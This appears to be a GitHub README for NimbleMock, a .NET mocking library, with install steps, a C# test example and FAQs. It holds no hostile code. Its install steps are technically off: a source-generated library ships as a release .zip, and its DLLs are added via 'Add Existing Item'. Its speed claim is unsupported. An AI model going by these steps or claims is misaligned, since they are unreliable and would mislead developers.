# 🚀 NimbleMock - Fast and Easy .NET Mocking

[![Download NimbleMock](https://img.shields.io/badge/Download_NimbleMock-v1.0-blue)](https://github.com/mohamed1420/NimbleMock/releases)

## 📖 Introduction

NimbleMock is a zero-allocation, source-generated .NET mocking library. It is designed to help developers create tests for their applications quickly and efficiently. This library works 34 times faster than other options like Moq and provides features such as partial mocks, static mocking, a fluent API, and support for asynchronous operations. It simplifies testing, allowing developers to concentrate on building great software.

## 📦 System Requirements

To run NimbleMock effectively, your system should meet the following requirements:

- Operating System: Windows 10 or higher, macOS, or compatible Linux distribution
- .NET SDK: Version 5.0 or higher 
- Visual Studio 2019 or later recommended (or any compatible IDE)
- Basic knowledge of unit testing concepts

## 🚀 Getting Started

To get started with NimbleMock, follow these simple steps. 

1. **Visit the Releases Page**  
   Click the link below to visit the Releases page, where you can download NimbleMock:

   [Download NimbleMock](https://github.com/mohamed1420/NimbleMock/releases)

2. **Download the Latest Version**  
   On the Releases page, locate the latest version of NimbleMock. You will see a list of available downloads. Each version includes a .zip file that contains the library files.

3. **Extract the Files**  
   After downloading, locate the .zip file in your Downloads folder. Right-click on it and select "Extract All". Choose a location on your computer to save the extracted files.

4. **Add to Your Project**  
   Open your .NET project in Visual Studio or your chosen IDE. Add NimbleMock to your project by following these steps:  
   a. Right-click on your project in the Solution Explorer.  
   b. Select "Add" > "Existing Item".  
   c. Browse to the location where you extracted the NimbleMock files, and select the appropriate .dll files. Press "Add".

5. **Set Up Your Test**  
   To begin using NimbleMock, you will need to create a test project if you haven’t done so already. Use the following steps:  
   a. Right-click your Solution and choose "Add" > "New Project".  
   b. Select a testing framework, such as NUnit or xUnit.  
   c. Follow on-screen instructions to complete the setup.

6. **Write Your First Mock**  
   After setting up the test project, you can start writing your first mock. Here is a simple example:  

   ```csharp
   using NimbleMock;

   public class MyServiceTests
   {
       [Test]
       public void MyTest()
       {
           var mockService = new Mock<IMyService>();
           mockService.Setup(service => service.GetData()).Returns("Hello, World!");
           
           var result = mockService.Object.GetData();
           
           Assert.AreEqual("Hello, World!", result);
       }
   }
   ```

7. **Run Your Tests**  
   Finally, run your tests by using the built-in test runner in your IDE. You should see the results in the Test Explorer window, which will display passed and failed tests.

## 📥 Download & Install

You can find and download the latest version of NimbleMock by visiting this page:

[Download NimbleMock](https://github.com/mohamed1420/NimbleMock/releases)

Follow the steps outlined above for a simple installation process. If you encounter any issues, check the GitHub page for troubleshooting tips.

## 🔍 Features

NimbleMock provides a variety of features to enhance your testing experience:

- **Zero-Allocation:** No memory allocations during mock creation, improving performance.
- **Static Mocking:** Mock static methods easily.
- **Partial Mocks:** Mock parts of your classes without needing to write extensive boilerplate code.
- **Fluent API:** Enjoy an intuitive syntax that makes your tests more readable.
- **Async Support:** Easily mock asynchronous methods, making it perfect for modern applications.

## 📖 Documentation

For more detailed information on how to use NimbleMock, check the official documentation available on the GitHub Wiki page. You can find examples, advanced features, and best practices to enhance your unit testing.

## 🛠️ Contributing

If you'd like to contribute to NimbleMock, we welcome your input! Please visit the **Contributing** section on the GitHub page to learn more about our code of conduct and the process for making contributions.

## 🤔 Frequently Asked Questions (FAQs)

### 1. Can I use NimbleMock with existing projects?

Yes, you can integrate NimbleMock into both new and existing .NET projects.

### 2. What testing frameworks does NimbleMock support?

NimbleMock is compatible with popular testing frameworks such as NUnit, xUnit, and MSTest.

### 3. How do I report issues or request features?

For reporting issues or requesting features, use the Issues tab on the GitHub repository.

By following these steps and guidelines, you will successfully install and leverage NimbleMock for your unit testing needs. Happy testing!